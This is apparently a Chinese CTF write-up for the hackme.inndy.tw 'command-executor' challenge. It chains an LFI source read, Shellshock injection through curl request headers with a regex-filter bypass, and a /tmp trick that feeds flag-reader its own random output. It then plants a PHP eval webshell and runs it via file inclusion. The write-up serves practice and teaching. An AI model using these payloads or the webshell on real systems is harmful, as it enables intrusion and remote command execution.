@@ -1,0 +1,183 @@
+$ ls .
+total 332
+drwxr-xr-x 4 root root   4096 Jan  9  2018 bootstrap
+-rw-r--r-- 1 root root 293424 Jan  9  2018 cat-flag.png
+-rw-r--r-- 1 root root   1163 Jan  9  2018 cmd.php
+drwxr-xr-x 2 root root   4096 Jan  9  2018 comic-neue
+-rw-r--r-- 1 root root    612 Jan 19  2018 index.nginx-debian.html
+-rw-r--r-- 1 root root   2201 Jan  9  2018 index.php
+-rw-r--r-- 1 root root    515 Jan  9  2018 ls.php
+-rw-r--r-- 1 root root    658 Jan 19  2018 man.php
+-rw-r--r-- 1 root root    588 Jan  9  2018 untar.php
+-rw-r--r-- 1 root root  11829 Jan  9  2018 windows-run.jpg
+
+https://command-executor.hackme.inndy.tw/index.php?func=ls
+https://command-executor.hackme.inndy.tw/index.php?func=cmd
+https://command-executor.hackme.inndy.tw/index.php?func=untar
+https://command-executor.hackme.inndy.tw/index.php?func=man
+==========================================================
+利用LFI读网页源码。
+https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=ls
+==========================================================
+代码审计
+function execute($cmd, $shell='bash') {
+    system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));
+}
+
+foreach($_SERVER as $key => $val) {
+    if(substr($key, 0, 5) === 'HTTP_') {
+        putenv("$key=$val");
+    }
+}
+会调用bash,并且能往环境变量里写东西。(Google 搜索 「env shell security bug」，)对应shellshock漏洞。
+
+==========================================================
+shellshock(CVE-2014-6271)
+在会调用bash的页面下能触发漏洞
+测试 payload: env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+curl 'https://command-executor.hackme.inndy.tw/index.php?func=man' --header 'AAA: () { :;}; echo vulnerable'
+\(\)\s*\{\s*:;\s*\}; detected! exit now.
+绕过
+curl 'https://command-executor.hackme.inndy.tw/index.php?func=man' --header 'AAA: () { foo;}; echo vulnerable'
+
+==========================================================
+curl 'https://command-executor.hackme.inndy.tw/index.php?func=man' --header 'AAA: () { foo; }; /usr/bin/id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+man这个命令没有得到执行
+
+漏洞环境测试：
+bash-4.3# php -r '''putenv("HTTP_AAA=() { foo; }; /usr/bin/id");system("bash -c man");'''
+uid=0(root) gid=0(root) groups=0(root)
+Segmentation fault (core dumped)
+man这个命令没有执行,只执行了/usr/bin/id,与实际情况相符
+
+并且还有以下情况
+bash-4.3# php -r '''putenv("HTTP_AAA=() { foo; }; /usr/bin/id;/usr/bin/id");system("bash -c man");'''
+uid=0(root) gid=0(root) groups=0(root)
+Segmentation fault (core dumped)
+bash-4.3# php -r '''putenv("HTTP_AAA=() { foo; };echo abc;echo def;/usr/bin/id;echo 1234;echo 456");system("bash -c man");''' 
+abc
+def
+uid=0(root) gid=0(root) groups=0(root)
+Segmentation fault (core dumped)
+
+命令执行一次后就会中断
+
+==========================================================
+$ ls /
+
+total 88
+drwxr-xr-x   2 root root 4096 Jan 19  2018 bin
+drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
+drwxr-xr-x   5 root root  340 Jun  7 10:06 dev
+drwxr-xr-x  85 root root 4096 Jan 19  2018 etc
+-r--------   1 flag root   37 Jan  9  2018 flag
+-rwsr-xr-x   1 flag root 9080 Jan 19  2018 flag-reader
+-rw-r--r--   1 root root  653 Jan  9  2018 flag-reader.c
+drwxr-xr-x   2 root root 4096 Apr 12  2016 home
+-rwxr-xr-x   1 root root  100 Jan  9  2018 init
+drwxr-xr-x  12 root root 4096 Jan 19  2018 lib
+drwxr-xr-x   2 root root 4096 Jan 19  2018 lib64
+drwxr-xr-x   2 root root 4096 May  3  2016 media
+drwxr-xr-x   2 root root 4096 May  3  2016 mnt
+drwxr-xr-x   2 root root 4096 May  3  2016 opt
+dr-xr-xr-x 282 root root    0 Jun  7 10:06 proc
+drwx------   2 root root 4096 Feb 16  2018 root
+drwxr-xr-x   6 root root 4096 Feb 17  2019 run
+drwxr-xr-x   2 root root 4096 Jan 19  2018 sbin
+drwxr-xr-x   2 root root 4096 May  3  2016 srv
+dr-xr-xr-x  13 root root    0 Jun  9 14:02 sys
+drwxrwx-wt   2 root root 4096 Jun 15 15:33 tmp
+drwxr-xr-x  19 root root 4096 Feb 16  2018 usr
+drwxr-xr-x  22 root root 4096 Jan 23  2018 var
+==========================================================
+-rwsr-xr-x   1 flag root 9080 Jan 19  2018 flag-reader
+suid(set User ID,set UID)的意思是进程执行一个文件时通常保持进程拥有者的UID。然而，如果设置了可执行文件的suid位，进程就获得了该文件拥有者的UID。
+sgid(set Group ID,set GID)意思也是一样，只是把上面的进程拥有者改成进程组就好了。
+
+1、-rwsr-xr-x 表示设置了suid，且拥有者有可执行权限
+2、-rwSr--r-- 表示suid被设置，但拥有者没有可执行权限
+3、-rwxr-sr-x 表示sgid被设置，且群组用户有可执行权限
+4、-rw-r-Sr-- 表示sgid被设置，但群组用户没有可执行权限
+
+drwxrwx-wt   2 root root 4096 Jun 15 15:33 tmp
+可写 不可读
+==========================================================
+/bin/cat /flag-reader.c
+\/flag detected! exit now.
+==========================================================
+/bin/cat /*.c
+#include <unistd.h>
+#include <syscall.h>
+#include <fcntl.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+	char buff[4096], rnd[16], val[16];
+	if(syscall(SYS_getrandom, &rnd, sizeof(rnd), 0) != sizeof(rnd)) {
+		write(1, "Not enough random\n", 18);
+	}
+
+	setuid(1337);
+	seteuid(1337);
+	alarm(1);
+	write(1, &rnd, sizeof(rnd));
+	read(0, &val, sizeof(val));
+
+	if(memcmp(rnd, val, sizeof(rnd)) == 0) {
+		int fd = open(argv[1], O_RDONLY);
+		if(fd > 0) {
+			int s = read(fd, buff, 1024);
+			if(s > 0) {
+				write(1, buff, s);
+			}
+			close(fd);
+		} else {
+			write(1, "Can not open file\n", 18);
+		}
+	} else {
+		write(1, "Wrong response\n", 16);
+	}
+}
+
+输入和产生的随机数一样
+可以把输出内容指向输入,这里需要一个中间文件转发
+/tmp/ 文件可写
+==========================================================
+测试
+curl 'https://command-executor.hackme.inndy.tw/index.php?func=man' --header 'AAA: () { foo; }; echo 1234 >/tmp/1;/bin/cat /tmp/1'
+
+exploit
+curl 'https://command-executor.hackme.inndy.tw/index.php?func=man' --header 'AAA: () { foo; }; /fla*-reader /fla* >/tmp/1 </tmp/1'
+curl 'https://command-executor.hackme.inndy.tw/index.php?func=man' --header 'AAA: () { foo; };/bin/cat /tmp/1'
+
+
+==========================================================
+$ ls /var/
+
+total 40
+drwxr-xr-x  2 root root  4096 Apr 12  2016 backups
+drwxr-xr-x  9 root root  4096 Jan 19  2018 cache
+drwxr-xr-x 25 root root  4096 Jul 24  2019 lib
+drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
+lrwxrwxrwx  1 root root     9 May  3  2016 lock -> /run/lock
+drwxr-xr-x  6 root root  4096 Jan 19  2018 log
+drwxrwsr-x  2 root mail  4096 May  3  2016 mail
+drwxr-xr-x  2 root root  4096 May  3  2016 opt
+lrwxrwxrwx  1 root root     4 May  3  2016 run -> /run
+drwxr-xr-x  2 root root  4096 May  3  2016 spool
+drwxrwxrwt  2 root root  4096 Jun 16 01:30 tmp
+drwxr-xr-x  4 root root  4096 Jan 19  2018 www
+==========================================================
+同时可以写php文件 利用文件包含得到webshell
+
+
+
+curl 'https://command-executor.hackme.inndy.tw/index.php?func=man' --header 'AAA: () { foo; };/bin/echo  "<?php @eval(\$_POST[\"hp\"]);?>" >/var/tmp/s.php'
+
+curl 'https://command-executor.hackme.inndy.tw/index.php?func=/var/tmp/s' --form 'hp="system(\"ls -al /\");"'
+
+
+
